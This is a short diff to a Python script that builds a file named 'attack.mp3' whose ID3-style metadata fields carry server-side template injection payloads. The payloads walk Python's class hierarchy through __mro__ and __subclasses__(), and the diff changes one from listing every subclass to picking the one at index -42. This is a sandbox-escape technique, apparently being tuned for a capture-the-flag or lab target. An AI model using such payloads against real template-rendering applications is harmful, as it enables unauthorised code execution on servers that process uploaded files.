@@ -14,6 +14,6 @@ create_modify_mp3(
     "attack.mp3",
     "Evil",
     # "{{ [].__class__.__mro__[1].__subclasses__()[-61].get_comments(html_con, )}}",
-    "{{[].__class__.__mro__[1].__subclasses__()}}",
+    "{{[].__class__.__mro__[1].__subclasses__()[-42]}}",
     "Techno",
 )
